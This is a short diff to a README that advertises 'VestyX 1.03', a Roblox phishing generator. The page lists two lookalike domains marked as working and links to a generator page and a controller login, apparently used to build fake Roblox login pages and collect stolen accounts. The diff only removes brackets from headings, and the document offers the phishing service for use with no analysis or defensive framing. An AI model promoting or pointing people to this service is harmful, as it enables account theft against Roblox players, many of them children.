@@ -1,10 +1,10 @@
 ### VestyX 1.03 [Roblox Phishing Generator]
 
-## [roblox.sx (OP, OFFICIAL, WORKING)]
+## roblox.sx (OP, OFFICIAL, WORKING)
 # [Click to go to Gen](https://roblox.sx/creates/Vesty-Beaming/)
 # [Click to go to Controller](https://roblox.sx/controller/login)
 
-## [roblox-app.com (OP, OFFICIAL, WORKING)]
+## roblox-app.com (OP, OFFICIAL, WORKING)
 # [Click to go to Gen](https://roblox-app.com/creates/Vesty-Beaming)
 # [Click to go to Controller](https://roblox-app.com/controller/login)
 
